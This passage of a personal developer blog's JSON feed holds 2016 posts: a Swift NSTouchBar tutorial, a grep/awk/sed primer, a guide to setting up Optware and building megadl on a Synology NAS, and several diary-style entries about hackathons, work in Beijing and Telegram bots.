以及其他相关的概念。\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"随感","permalink":"http://blog.cee.moe/casual-thinking.html","link":"http://blog.cee.moe/casual-thinking.html","date":"2016-10-30T00:00:00-07:00","modified":"2016-10-30T02:47:43-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"从上次 Hackathon 回来之后，逛了一些朋友的博客（比如陈叔、小萌、BlueCocoa、执一、soruly），感觉到和这些 Full-Stack Developer 的差距还是挺大的。\n\n对自己的评价可能就如图的感受：\n\n\n\n\n  跪在地上：我代码不精，封装无力，架构松散，Debug 迟缓，就我这种 lowbee 还能和各位 Dalao 同在一个群，感谢各位管理员。(;´༎ຶД༎ຶ`)\n\n\n\n\n和各位大大交流后，自己也思考了一下这种感觉的来源，不出意外的发现是初中和高中荒废的六年。住校期间正好是 Web 发展最最最迅猛的时代，失去了对外的联系，失去了一切接触新鲜事物的机会。\n\n不知道对这样的过去是应该悔恨还是喜欢。一方面自然失去了很多 Coding 的机会，能力自然不足；另一方面又养成了很多 Coding 之外的爱好（不一一列举，懂的人自然懂），以及非常强大的自我学习的能力。\n\n剩下一点住宿生活带给自己最大的慰藉在于，生活能力真的比同龄或者比我大四五岁的人高出不少。喜欢一个人思考问题，一个人独居，一个人旅游。\n\n\n\n对了，下了班之后总感觉自己很累。欢迎晚上九点之后找我聊天。一切你知道的 IM 都可以找到我。\n","excerpt":"从上次 Hackathon 回来之后，逛了一些朋友的博客（比如陈叔、小萌、BlueCocoa、执一、soruly），感觉到和这些 Full-Stack Developer 的差距还是挺大的。\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"TouchBar 入门开发指南","permalink":"http://blog.cee.moe/touchbar-tutorial.html","link":"http://blog.cee.moe/touchbar-tutorial.html","date":"2016-10-28T00:00:00-07:00","modified":"2016-10-28T03:53:47-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Environments / 环境要求\n\n\n  macOS Sierra 10.12.1 (16B2657)\n  Xcode 8.1 (8B62)\n\n\n可以通过 https://developer.apple.com/ 获取更多配置环境信息。\n\nGet Started / 上手实践\n\n要实现 NSTouchBar，我们必须做下面三件事情：\n\n\n  继承 NSResponder\n  遵循 NSTouchBarProvider 协议\n  在 NSTouchBarProvider 协议中实现 makeTouchBar() 方法\n\n\n我们都知道，NSViewController 是 NSResponder 的一个子类实现（如果对 NSResponder 的原理不了解，可以参看这篇文章）。在 NSTouchBarProvider 的定义下方，可以看到在 10.12.1 中的 NSResponder 已经遵循了 NSTouchBarProvider 协议：\n\npublic protocol NSTouchBarProvider : NSObjectProtocol {\n    @available(OSX 10.12.1, *)\n    public var touchBar: NSTouchBar? { get }\n}\n\nextension NSResponder : NSTouchBarProvider {\n    @available(OSX 10.12.1, *)\n    open var touchBar: NSTouchBar?\n\n    @available(OSX 10.12.1, *)\n    open func makeTouchBar() -&gt; NSTouchBar?\n}\n\n\n\n所以，对于开发者来说，你要做的，就是对任何一个继承自 NSResponder 的元素，去实现 makeTouchBar() 方法。\n\n我们来做一个最简单的 TouchBar 应用：在屏幕上随机生成两个 0 到 9 的整数，通过点击 TouchBar 中的按钮来比较两个数大小，并给出结果。完成后的效果如图：\n\n\n\nProject Init / 新建工程\n\n打开 Xcode，并新建一个 Xcode 工程。选择 macOS 上的 Cocoa Application，点击下一步，输入项目名称 TouchBarSample，并在勾选使用 Storyboards。在这里我们选择使用 Swift 3.0 开发。\n\n\n\n进入 Main.storyboard，删除默认的 Window Controller 和 View Controller。我们在左边的项目中新建我们的 WindowController。选择新建一个 Cocoa Class，类名为 WindowController，继承自 NSWindowController 并勾选使用 XIB 文件。\n\n\n\n打开 WindowController.swift，重写其 windowNibName 属性：\n\noverride var windowNibName: String? {\n    return \"WindowController\"\n}\n\n\n\n接下来，修改在 AppDelegate.swift 中的代码，让刚刚创建的 WindowController 显示在屏幕上：\n\nimport Cocoa\n\n@NSApplicationMain\nclass AppDelegate: NSObject, NSApplicationDelegate {\n\n    var windowController: NSWindowController?\n\n    func applicationDidFinishLaunching(_ aNotification: Notification) {\n        // Insert code here to initialize your application\n        let windowController = WindowController()\n        windowController.showWindow(self)\n        self.windowController = windowController\n        \n    }\n\n    func applicationWillTerminate(_ aNotification: Notification) {\n        // Insert code here to tear down your application\n    }\n\n}\n\n\n\n再点击 WindowController.xib，拖拽组件，摆放如下图所示（一共五个 NSTextField，以及一个 NSButton）：\n\n\n\n现在，可以转战 WindowController.swift，专注于 TouchBar 的开发了。\n\nImplement TouchBar / 实现 TouchBar\n\n在实现之前，先来结合文档了解一下接下来所使用到的属性和方法。\n\nopen class NSTouchBar : NSObject, NSCoding {\n    // 初始化方法\n    public init()\n    public init?(coder aDecoder: NSCoder)\n\n\t// 用于标识自定义 TouchBar\n\t// 如果标识符不存在，则无法自定义 TouchBar 中的内容\n    open var customizationIdentifier: NSTouchBarCustomizationIdentifier?\n\n\t// 存储 TouchBar 中不同 Item 的标识的数组\n\t// 分别对应了\n\t// 1. 可自定义的 BarItem 对象\n\t// 2. 不可移除的 BarItem 对象\n\t// 3. 默认显示的 BarItem 对象\n    open var customizationAllowedItemIdentifiers: [NSTouchBarItemIdentifier]\n    open var customizationRequiredItemIdentifiers: [NSTouchBarItemIdentifier]\n    open var defaultItemIdentifiers: [NSTouchBarItemIdentifier]\n\n    // 用于动态生成 BarItem\n    // 需要实现 NSTouchBarDelegate 协议\n    weak open var delegate: NSTouchBarDelegate?\n}\n\n\n\n其他的属性和方法在这里不再深究。通过初步了解，为了实现一个能够自定义的、最基本的 TouchBar，你需要：\n\n\n  给你的 TouchBar 和 Bar Item 生成标识符\n  告诉 TouchBar 默认会显示哪些 Bar Item\n  让 TouchBar 生成这些 Bar Item\n\n\n给你的 TouchBar 和 Bar Item 生成标识符\n\n打卡 WindowController.swift，在 import Cocoa 和 class WindowController 中间插入以下代码，用于生成 TouchBar 和 Bar Item 的标识符：\n\nfileprivate extension NSTouchBarCustomizationIdentifier {\n    static let touchBar = NSTouchBarCustomizationIdentifier(\"io.Cee.TouchBarSample.touchBar\")\n}\n\nfileprivate extension NSTouchBarItemIdentifier {\n    static let smaller = NSTouchBarItemIdentifier(\"io.Cee.TouchBarSample.smaller\")\n    static let equal = NSTouchBarItemIdentifier(\"io.Cee.TouchBarSample.equal\")\n    static let bigger = NSTouchBarItemIdentifier(\"io.Cee.TouchBarSample.bigger\")\n}\n\n\n\n告诉 TouchBar 默认会显示哪些 Bar Item\n\n有了这些标识符，你就可以自定义 TouchBar 中间显示的内容了。在 windowDidLoad() 方法下方实现 makeTouchBar()：\n\n// MARK: - NSTouchBar\n    \n@available(OSX 10.12.1, *)\noverride func makeTouchBar() -&gt; NSTouchBar? {\n    let touchBar = NSTouchBar()\n    \n    // 接下来让 WindowController 实现 NSTouchBarDelegate\n    // 生成 &lt; = &gt; 三个比较符号\n    touchBar.delegate = self \n    \n    // 给 TouchBar 一个标识\n    touchBar.customizationIdentifier = .touchBar\n    \n    // 提供默认的 Bar Item 选项\n    touchBar.defaultItemIdentifiers = [.smaller, .equal, .bigger]\n    touchBar.customizationAllowedItemIdentifiers = [.smaller, .equal, .bigger]\n    \n    return touchBar\n}\n\n\n\n让 TouchBar 生成这些 Bar Item\n\n下面来实现 NSTouchBarDelegate。通过不同的标识（identifier）可以区别不同的 Bar Item。\n\nextension WindowController: NSTouchBarDelegate {\n    @available(OSX 10.12.1, *)\n    func touchBar(_ touchBar: NSTouchBar, makeItemForIdentifier identifier: NSTouchBarItemIdentifier) -&gt; NSTouchBarItem? {\n        // 生成自定义的 Bar Item\n        let touchBarItem = NSCustomTouchBarItem(identifier: identifier)\n        \n        // 根据不同标识生成不同的 title\n        var title: String\n        switch identifier {\n            case NSTouchBarItemIdentifier.smaller: title = \"&lt;\"\n            case NSTouchBarItemIdentifier.equal: title = \"=\"\n            case NSTouchBarItemIdentifier.bigger: title = \"&gt;\"\n            default: title = \"\"\n        }\n        \n        let touchBarButton = NSButton(title: title, target: self, action: #selector(compare(with:)))\n        touchBarItem.view = touchBarButton\n\n        return touchBarItem;\n    }\n}\n\n\n\n我们在这里使用了自定义的 NSCustomTouchBarItem。系统同时也提供下面几种不同的 BarItem：\n\n\n  NSGroupTouchBarItem\n  NSPopoverTouchBarItem\n  NSSliderTouchBarItem\n  NSColorPickerTouchBarItem\n  NSCandidateListTouchBarItem\n\n\n完成剩余部分\n\n\n  关联组件：使用 Ctrl-drag 将界面组件拖到代码中。\n\n\n@IBOutlet weak var numberA: NSTextField!\n@IBOutlet weak var numberB: NSTextField!\n@IBOutlet weak var resultLabel: NSTextField!\n\n\n\n\n  实现比较方法 compare(with:)：\n\n\n// MARK: - Private Method\n\nfunc compare(with symbol: NSButton) {\n    let number1 = numberA.intValue\n    let number2 = numberB.intValue\n    var result: Bool\n    switch symbol.title {\n        case \"&lt;\": result = (number1 &lt; number2)\n        case \"=\": result = (number1 == number2)\n        case \"&gt;\": result = (number1 &gt; number2)\n        default: result = false\n    }\n    resultLabel.stringValue = (result == true) ? \"Correct\" : \"Wrong\"\n}\n\n\n\n\n  关联 Randomize 按钮，生成随机数：\n\n\n// MARK: - Button Action\n    \n@IBAction func randomize(_ sender: NSButton) {\n    reset()\n}\n\n// MARK: - Private Method\n\nfunc reset() {\n    numberA.intValue = randomAInt()\n    numberB.intValue = randomAInt()\n    resultLabel.stringValue = \"\"\n}\n\nfunc randomAInt() -&gt; Int32 {\n\treturn Int32(arc4random_uniform(10))\n}\n\n\n\n\n  最后别忘了在 windowDidLoad() 中随机生成两个数。修改 windowDidLoad() 方法：\n\n\noverride func windowDidLoad() {\n    super.windowDidLoad()\n    reset()\n}\n\n\n\n大功告成！运行一下你的程序，使用 Command+Shift+5 快速调出模拟的 TouchBar 窗口测试吧！\n\n\n\nReferences - 参考\n\n\n  官方的 NSTouchBar 开发文档：https://developer.apple.com/reference/appkit/nstouchbar\n  代码地址：https://github.com/Cee/TouchBarSample\n\n","excerpt":"Environments / 环境要求\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"写在第一次 Hackathon 之后","permalink":"http://blog.cee.moe/after-my-first-hackathon.html","link":"http://blog.cee.moe/after-my-first-hackathon.html","date":"2016-10-17T00:00:00-07:00","modified":"2016-10-17T20:14:56-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"序\n\n对于一个 Hackathon 萌新来说，这一次的参赛有一些特别。因为是我：\n\n\n  第一次加入 hACKbUSTER\n  第一次参加 Hackathon\n  第一次同时参加两场 Hackathon😂\n\n\n起\n\n上大学的时候就想着有机会要参加一次 Hackathon。可惜老天看不上我，正准备报名某场 Hackathon 的时候让我发了病，于是就在大学期间错过了可以参加的 Hackathon。\n\n前段时间正好和陈叔还有小萌看到 HACKxFDU 能够报名，而且毕了业的貌似也能报名（笑），就鼓起勇气试了一下。在某个周末竟然收到了入选的消息。\n\n\n\n感觉一阵狂喜，焦急地等待官网的上线和选手的注册。结果等到周三还没有任何的通知。陈叔急了，说不如我们去参加 SF 承办的云赛空间的吧。点头后遂报名，一看日期还是同一天，自己感觉压力好大。「不过既然报了名两边就得好好做」，心想。\n\n周五早早的到达火车站，见到了 hACKbUSTER 的另外一名 ACM 大神思宇。然而可怜的陈叔忘带了身份证，匆匆忙忙补办后一路狂奔至车厢，上车，踏上征战魔都 Hackathon 的旅程。\n\n承\n\n考虑到后者的奖金丰厚，我们把重心放在了 SF 的比赛上。下午到达酒店放下行李，坐地铁到 FDU 参加晚上的 HACKxFDU 的开幕式。找到 WPH 之后，商讨一下两边的 Hackathon 做什么。晚上九点确定了一下大致的分工：\n\n\n  重心放在明天的云赛空间的 Hackathon 上\n  HACKxFDU 应该会左一个类似于 CodeVS 的编辑器或者 IDE，不过适合 k12 的小朋友们使用，避免配置额外的 Runtime 环境\n  可能有一部分人得来回赶着 Coding\n\n\n考虑到第二天要早起参加骑摩拜的开幕式，晚上就把编辑器的事情讨论到了十一点，就宾馆早点睡了（其实到了宾馆看了下如何开发 Electron App 就一不小心看到了凌晨三点多）。\n\n周六早上七点半起来，匆忙吃好早饭打了个车赶到云赛空间 Hackathon 的开幕式会场。见到了颜值担当的主持人烧碱，莫名有种已经赚回了来回路费的错觉。在摩拜单车的 CEO 发表致辞后，一行人骑了摩拜单车来到了会场。\n\n十点比赛正式开始，主题是「如何提升我们的城市生活体验」。拿到题目后感觉有点懵逼，不过在讨论了一些关于智能路灯、垃圾回收的主题后思路开始慢慢清晰——我们要做的是一款基于 LBS 的信息共享的应用，配合微软的认知服务（比赛必须使用，┑(￣Д ￣)┍）来增进人与人之间的感情，缩短人与人之间的距离。名字就取了个和之前 Fix++ 相类似的名字：Connect++。趁着大家都去吃饭的时候，我们团队四个人就又从云赛空间偷偷溜走，骑摩拜到地铁站去复旦 HACKxFDU 露面。算下来这十二个小时什么都没干。\n\n到达复旦已经是下午两点。正式确认了一下两边的接下来的分配：WPH 负责 Playground 的后端实现和对接企业 SDK；我负责 Playground 的前端、App Icon 设计以及 Electron 的封装对接；剩下三位就开始做 Connect++。定下来这个小的 Playground 叫做 Delight 后，一路踩坑到了晚上九点，自己算是基本完成了前端的界面的改造设计，以及 Electron 文件的初步封装。小萌也基本上做完了 Connect++ 的设计稿，陈叔和思宇也基本接上了 Mapbox。WPH 感冒先回酒店睡觉，于是剩下四个人又打了辆车回到了云赛的比赛场地。晚上十一点，四个人分完设计稿中的内容，开始挑战编程极限。\n\n中途 Xcode 不知道死了几次，Chrome 和 Safari 的 Tab 可能估计有 100+。到了四点在小萌做完最后一个 TagView 趴下睡觉后，我和陈叔两个人又骑了摩拜单车出去觅食。跨过不知道多少个路口，最后在一个保安的帮助下，终于找到一家 24 小时营业的 Family Mart。两人买完泡面和食物饮料后深感 Connect++ 这个 App 的重要性。回到比赛场地后继续开始修各种 Bug。五点，喝完红牛的我依旧困的不行。在后排找了八张凳子拼了个小床，倒下就躺下睡了一小时。之后陈叔和小萌又轮流睡了一会儿，恢复一下精神。早晨八点多钟，Connect++ 的开发也基本完成，WPH 也从睡梦中醒来，把最后的一点代码交给我打包进 Electron 的工程当中。\n\n\n\n合\n\n最后等待结果的时候人的状态是又困又紧张又兴奋的。在云赛空间我们是第⑨个上台演示的，而且自我感觉良好，无论对比前面的八组 PPT 还是后面十一组的 PPT。结果很可惜，评委老师的水平太一般，最后只拿了三等奖 1W 元和华硕的键鼠耳机套装。\n\n知道名次拿到奖品后，听说 Delight 已经进入前九的路演环节，四人马上飞奔至 WPH 那，等待最后的结果。在复旦的食堂中睡了一个半小时后，得知 WPH 最后不幸没拿到前三（据说都是复旦的），五人就去大吃大喝了。\n\n\n\n在虹桥睡了一晚上，小萌最后飞机没赶上，我、思宇、陈叔抱着奖品回了北京，这么两场 Hackathon 就这么结束了。\n\n感受和吐嘈\n\n感受\n\n作为一个萌新第一次参加 Hackathon，第一次就在两天时间内参与了两场平行举行的 Hackathon 比赛😂。这种爆肝做项目的感觉真是好（bu）到（xiang）爆（you）。不过还是要感谢一下 HACKxFDU 以及云赛空间，更感谢一下 hACKbUSTER 的队友们：陈叔、思宇、小萌、WPH🎉。\n\n\n\n吐嘈\n\n\n  HACKxFDU 的管理团队实在是好烂，没见过这么烂的。\n  HACKxFDU 提供的比赛场地就和狗窝一样，还有食品和饮料，简直就是和抢劫一样，实在是好烂，没见过这么烂的。\n  云赛的评委基本不懂技术，实在是好烂，没见过这么烂的。\n  云赛的其他组做的产品（PPT）做的实在是好烂，没见过这么烂的。\n\n\n\n\n最后介绍一下两个 App\n\nDelight\n\n\n\n\n\nLearn with delight, learn with Delight. Delight is a light-weight code editor and playground that helps connect teacher with students.\n\nConnect++\n\n\n\nConnect ++ is a LBS information sharing platform. Simple click to share your information and simple click to view the information shared by others, we connect the citizens in this city together to build a smarter city. Furthermore, we could provide open API for public service and utilities to upload their information onto our platform, with more latest and location-related information. It could be the fundamental platform to build smarter city.\n","excerpt":"序\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"A brief introduction to grep, awk & sed","permalink":"http://blog.cee.moe/a-brief-introduction-to-grep-awk-and-sed.html","link":"http://blog.cee.moe/a-brief-introduction-to-grep-awk-and-sed.html","date":"2016-08-23T00:00:00-07:00","modified":"2016-08-23T07:16:19-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"grep, awk and sed are three of the most useful command-line tools1 in *nix world. And this article will give you a brief introduction and basic usages of these three different commands.\n\n\n\ngrep\n\ngrep (Global Regular Expression Print) is used to search for specific terms in a file.\n\nDifferent from awk and sed, grep can’t add/modify/remove the text in a specific file. But it’s useful when we just want to search and filter out matches.\n\nUsage\n\n\n  Typical use\n\n\n# print every line that contains the word 'test'\ngrep 'test' file.txt\n\n\n\n\n  \n    -E / -P: Use extended / Perl compatible regular expression syntax.\n  \n  \n    -n: Show line number before each line.\n  \n  \n    -o: Only show the matching segment of the line.\n  \n  \n    -v: Print all of the lines that DO NOT match the search pattern.\n  \n  \n    -c: Show the number of the lines that contains the search pattern.\n  \n  \n    -i: Ignore case.\n  \n\n\nawk\n\nawk is a text pattern scanning and processing language, which is created by Aho, Weinberger &amp; Kernighan. awk is mostly used for data extraction and reporting (dealing with .csv files).\n\nEach awk procedure can be divided into three sections:\n\nBEGIN { ... initialization awk commands ...}\n{ ... awk commands for each line of the file ...}\nEND { ... finalization awk commands ...}\n\n\n\n\n  Control flow\n\n\nif (condition) statement [ else statement ]\nwhile (condition) statement\ndo statement while (condition)\nfor (expr1; expr2; expr3) statement\nfor (var in array) statement\nbreak\ncontinue\nexit [ expression ]\n\n\n\n\n  Built-in variables\n\n\n\n  \n    \n      Variable\n      Meaning\n    \n    \n      $0\n      Current line\n    \n    \n      $1 - $n\n      The nth field\n    \n    \n      FS\n      Input field separator, default value is “ “\n    \n    \n      NF\n      The number of fields/columns\n    \n    \n      NR\n      The number of records/rows\n    \n    \n      FNR\n      The number of records relative to the current input file\n    \n    \n      OFS\n      The output field separator, default value is “ “\n    \n    \n      ORS\n      The output record separator, default value is “\\n”\n    \n  \n\n\nUsage\n\n\n  Typical use\n\n\n# print 1st and 4th column\nawk '{print $1, $4}' file.txt\n\n# same with 'cat file.txt'\nawk '{print $0}' file.txt\n\n\n\n\n  -F: Set input field sparator\n\n\n# print 1st and 4th column separated by ':'\nawk -F: '{print $1, $4}' file.txt\n# or\nawk 'BEGIN {FS = \":\"} {print $1, $4}' file.txt\n\n\n\n\n  Pattern matching\n\n\n# print 2nd column when 1st field is precisely 'test'\nawk '$1 == \"test\" { print $2 }' file.txt\n\n# print 2nd column when 1st field contains 'test'\nawk '$1 ~ /test/ { print $2 }' file.txt\n\n# print 2nd column when 1st field DOES NOT contain 'test'\nawk '$1 !~ /test/ { print $2 }' file.txt\n\n# print 2nd column when this record contains 'test'\nawk '/test/ { print $2 }' file.txt\n\n# print 2nd column when this record DOES NOT contain 'test'\nawk '! /test/ { print $2 }' file.txt\n\n\n\n\n  In-place editing: -i (GNU awk 4.1.0 or later…)\n\n\nsed\n\nsed refers to Stream Editor. It can perform text transformations on a given file or an input stream.\n\nUsage\n\n\n  Print a line: p\n\n\n# treat this as using 'grep'\n# same with 'cat file.txt'\nsed '' file.txt\n\n# print every line that matches the regex pattern\nsed -n '/test/p' file.txt\n\n# match different patterns\nsed -n '/test1/, /test2/p' file.txt\n\n\n\n\n  Remove a line: d\n\n\n# remove every line that matches the regex pattern\nsed '/test/d' file.txt\n\n# remove 2nd line\nsed '2d' file.txt\n\n# remove from 2nd line to the end of the file\nsed '2,$d' file.txt\n\n\n\n\n  Substitution: s\n\n\n# replace the 1st 'test' with 'text' in each line\nsed 's/test/text/' file.txt\n\n# replace all 'test' with 'text' in each line\nsed 's/test/text/g' file.txt\n\n# replace the 2nd 'test' with 'text' in each line\nsed 's/test/text/2' file.txt\n\n# replace all 'test' from the 2nd to the end of each line with 'text'\nsed 's/test/text/2g' file.txt\n\n# replace the 'test' in the 2nd line with 'text'\nsed '2s/test/text/g' file.txt\n\n\n\n\n  Insert &amp; Append a whole line: i &amp; a\n\n\n# insert a new line before the 2nd line\nsed '2 i test' file.txt\n\n# append a new line after the 2nd line\nsed '2 a test' file.txt\n\n# append a new line after each line that matches the regex pattern\nsed '/test/a test' file.txt\n\n\n\n\n  Replace a whole line: c\n\n\n# replace the 2nd line with 'test'\nsed '2 c test' file.txt\n\n# replace each line that matches the regex pattern with 'text'\nsed '/test/c text' file.txt\n\n\n\n\n  In-place editing: -i\n\n\n# make immediate change!\nsed -i 's/test/text/g' file.txt\n\n\n\nAdvanced usage - Pattern Space &amp; Hold Space\n\n(Next article)\n\n\n  \n    \n      grep, awk and sed – three VERY useful command-line utilities&nbsp;&#8617;&#xfe0e;\n    \n  \n\n","excerpt":"grep, awk and sed are three of the most useful command-line tools1 in *nix world. And this article will give you a brief introduction and basic usages of these three different commands.\n\n\n  \n    \n      grep, awk and sed – three VERY useful command-line utilities&nbsp;&#8617;&#xfe0e;\n    \n  \n\n","languages":null,"categories":["note"],"tags":[]},{"title":"从 Bot 谈起","permalink":"http://blog.cee.moe/talking-from-bot.html","link":"http://blog.cee.moe/talking-from-bot.html","date":"2016-08-17T00:00:00-07:00","modified":"2016-08-17T09:22:43-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Bot\n\n最近看到 Telegram 上涌现出很多很有意思的 Bot（机器人），自己也在写一个 Bot。把这些 Bot 归归类无非也就分为以下几种：\n\n\n  娱乐类型的 Bot，比如狼人（@werewolfIIbot）、UNO（@mau_mau_bot）等；\n  图片视频类型的 Bot，比如 GIF 图片（@gif）等；\n  资讯信息类型的 Bot，比如投票（@vote）等。\n\n\n重点谈谈第三个，区别于前两者，这里我们在获取知识（Acquire knowledge）。尽管说互联网让我们获取信息的速度变快了，但是随着信息数量爆炸式地增长，有用的信息也相对在减少。如何在最短的时间内获得质量较高的内容和信息点必然是今后研究或者探讨的重点。\n\n举个例子：\n\n\n  您的 User ID: 63322333\n\n\n对于一个普通用户来说知道自己的 Telegram ID 有个〇〇用！(╯°Д°)╯︵ ┻━┻\n\n真正值得人们吸收营养的消息必然需要信息的加工处理。如果不，Bot 生成出来 99% 消息对 99% 的人来说都没啥用（我是说在座的各位写的 Bot，〇〇〇〇【自行脑补】），也可称其为 Toy（玩具）了。\n\nToy\n\n\n  Wikipedia：玩具泛指可用来玩的物品，通常与儿童或宠物有关。\n\n\n最近有和一些呆在创业公司的机油们聊天，都在说诸如：\n\n\n  啊我们的产品又是像素级抄袭〇〇。\n\n\n大家都知道的〇付宝的某界面像素级还原〇信。又或者：\n\n\n  PM 整天改需求真是〇〇〇〇〇〇〇。\n\n\n这种情况就是做产品的 PM 脑子进了水，像个孩子一样不考虑周全就把程序员当玩具耍，想做什么就是什么。反过来想想，各位的家长一定在你小（or 发脾气 or 过年 or 过生日）的时候会说：\n\n\n  「长大了，该像大人一样思考了。」\n\n\n然而上了班发现大多数人（尤其是 PM）还在和小孩子一样思考。「给我在几天中做一个〇〇」、「做不完〇〇就继续加班」已经是家长便饭了。缺乏理性的任务拆解、人员分配、时间估算，是绝大多数公司的通病。\n\n75 年出版的「人月神话」中说明了复杂的软件工程问题无法在短期内无靠简单的答案来解决，而到现在却很少有单位在实行具有意义的敏捷开发理论。使用 Scrum 组织开发流程真的是我在布丁实习中学到的最好的东西。\n\nOthers\n\n\n  我们总是会变成曾经自己讨厌的那种人。\n  自由是自己选择的：「要为自己喜欢的而活；健康与自由比一切都重要；业余爱好和工作一样重要；有能力的人绝不加班；远离那些不聪明且勤奋的人。」\n\n\n\n  PS：上一次写「从…谈起」还是写二分法的时候。Time flies.\n\n","excerpt":"Bot\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"帝都生存日记（07/13 - 08/07）","permalink":"http://blog.cee.moe/live-in-beijing-month-one.html","link":"http://blog.cee.moe/live-in-beijing-month-one.html","date":"2016-08-07T00:00:00-07:00","modified":"2016-08-06T23:55:06-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"来北京快一个月了，真的算是忙得飞起。想给自己一点时间记录记录生活工作，结果每天都是「感觉身体被掏空」。不过也很正常，一个月的时间来调整一下自己的作息，有机会和师傅（@JustZht）一样每天更新一下（前提是电脑天天带回家）。\n\n\n\n生活\n\n开始做早饭：下面、下饺子、下汤圆、烤面包。除了没怎么做过沙拉（冰箱里的紫甘蓝也快坏了吧）还有饼和煮粥，倒是基本上都做过了。\n\n\n\n\n\n\n\n由于上班时间就比较随意的原因，起居比较正常，基本上每天一点前睡觉，八点半起床。七月初刚到北京的时候，去宜家采购了一批非常实用的东西。继续安利餐巾纸夹和墙上的吸盘，还有宜家的桌板，真的太太太实用了！\n\n午饭就和陈叔说的那样，从来没带过饭，和师傅陈叔愿愿四个人吃得很 High。第一次喝到北冰洋的我也是一脸懵逼的，因为以前根本不知道这是啥，貌似北方才有吧。\n\n晚饭就更加随意，这一个月的约饭特别多。以至于回家做饭就做了一次，吃完饭洗完竟然已经十点半了，不禁觉得做晚饭这种事情还是放在周末做吧。\n\n工作\n\n去了渡鸦科技的 Lab 组，真的非常的 Geek（Especially 说的是陈叔），但是忙的时候真的忙成狗。没有打卡考勤，and do everything geek and you like！\n\n开始写 Animation，基本把初中和高中的数学知识忘给老师了。对于这种东西你们百分之一百也是懵逼的：\n\n\n\n开始写 Python，做了个很好玩的 Telegram Bot。\n\n其他工作方面的东西，还是保密😂！\n\n其他\n\n\n  办了一次  沙龙。希望八月份各位也能多多支持，在征集 CI 的 Speaker。\n  去杭州在 Connext 做了一次 Speaking，谢谢天语！Slides here.\n  订到了今年的「マジカルミライ２０１６」的票，小心脏受不了了！\n  还有月底去听 A 叔的钢琴独奏会！\n  强调一下执行力，真的很重要。\n  心智不成熟是一件很麻烦的事情。\n  吃饭吃什么是一件很纠结的事情，下个月希望通过第 5 点来把这个问题解决了。\n  继续准备刷一次 T，争取 105 吧。\n\n","excerpt":"来北京快一个月了，真的算是忙得飞起。想给自己一点时间记录记录生活工作，结果每天都是「感觉身体被掏空」。不过也很正常，一个月的时间来调整一下自己的作息，有机会和师傅（@JustZht）一样每天更新一下（前提是电脑天天带回家）。\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"How to build megadl on your Synology DS215j","permalink":"http://blog.cee.moe/how-to-build-megadl-on-your-synology-ds215j.html","link":"http://blog.cee.moe/how-to-build-megadl-on-your-synology-ds215j.html","date":"2016-04-05T00:00:00-07:00","modified":"2016-04-04T22:42:25-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Optware Bootstrap\n\nSet up ipkg\n\n1\n2\n3\n4\n5\n6feed=http://ipkg.nslu2-linux.org/feeds/optware/cs08q1armel/cross/unstable\nipk_name=`wget -qO- $feed/Packages | awk '/^Filename: ipkg-opt/ {print $2}'`\nwget $feed/$ipk_name\ntar -xOvzf $ipk_name ./data.tar.gz | tar -C / -xzvf -\nmkdir -p /opt/etc/ipkg\necho \"src cross $feed\" &gt; /opt/etc/ipkg/feeds.conf\n\n\nCreate the optware root directory\n\n1\n2\n3\n4mkdir /volume1/@optware\nmv /opt/* /volume1/@optware/\nrm -r /opt\nln -s /volume1/@optware /opt\n\n\nAdd /opt to PATH\n\nAdd the following line to /root/.profile or if you are using a user-account to get SSH access /home/username/.bashrc or the ZSH equivalent /home/username/.zshrc.\n\n1export PATH=/opt/bin:/opt/sbin:$PATH\n\n\nSet up the init-scripts\n\nCreate the folder where the script will be placed.\n\n1mkdir -p /usr/local/etc/rc.d/\n\n\n/usr/local/etc/rc.d/optware.sh:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59#!/bin/sh\n#\n# Optware setup\n# Alternatives Optware Startup und Shutdown Script #/usr/local/etc/rc.d/optware.sh\n#\ncase $1 in\nstart)\n       [ ! -h /opt -a ! -d /opt ] &amp;&amp; ln -s /volume1/@optware /opt\n       for i in /opt/etc/init.d/S??* ;do\n#\n               # Ignore dangling symlinks (if any).\n               [ ! -f \"$i\" ] &amp;&amp; continue\n#\n               case \"$i\" in\n                  *.sh)\n                       # Source shell script for speed.\n                       (\n                               trap - INT QUIT TSTP\n                               set start\n                               . $i\n                       )\n                       ;;\n                  *)\n                       # No sh extension, so fork subprocess.\n                       $i start\n                       ;;\n               esac\n       done\n       ;;\n#\nstop)\n#\n       for i in /opt/etc/init.d/S??* ;do\n#\n               # Ignore dangling symlinks (if any).\n               [ ! -f \"$i\" ] &amp;&amp; continue\n#\n               case \"$i\" in\n                  *.sh)\n                       # Source shell script for speed.\n                       (\n                               trap - INT QUIT TSTP\n                               set stop\n                              . $i\n                       )\n                       ;;\n                  *)\n                       # No sh extension, so fork subprocess.\n                       $i stop                       ;;\n               esac\n         done\n         ;;\n#\n*)\n         echo \"Usage: $0 [start|stop]\"\n         ;;\nesac\n#\n# End\n\n\nMake it executable.\n\n1chmod +x /usr/local/etc/rc.d/optware.sh\n\n\nThen reboot.\n\n1reboot\n\n\nInstall packages with ipkg\n\nUpdate the packages list and install packages that you need (like gawk etc.).\n\n1\n2ipkg update\nipkg install [YOUR PACKAGES] # I forget to take notes\n\n\nBuild megadl\n\nDownload toolchains from sourceforge and export correct paths.\n\nDownload megatools, unzip, configure, make, and you can build now.\n\nReference &amp; Thanks to\n\nhttp://freshest.me/bootstrap-ds215j\n","excerpt":"Optware 